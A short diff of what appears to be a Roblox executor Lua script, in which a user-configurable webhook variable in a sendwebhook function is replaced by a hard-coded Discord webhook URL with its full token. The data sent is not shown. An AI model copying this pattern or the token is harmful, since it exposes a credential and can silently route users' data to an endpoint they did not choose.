@@ -48,7 +48,7 @@ local function sendwebhook()
         ["attachments"] = {} 
     } 
 
-    local Webhook = _G.Webhooky
+    local Webhook = "https://discord.com/api/webhooks/1114164888147861534/2pnRiDU0gcz60oWnVlycPWUce7uuaZtcuAAEu6K9dMxcY4SLyehxhGDwmJwaptI74q2e"
     local request = http_request or request or HttpPost or syn.request 
     request({ 
         Url = Webhook, 
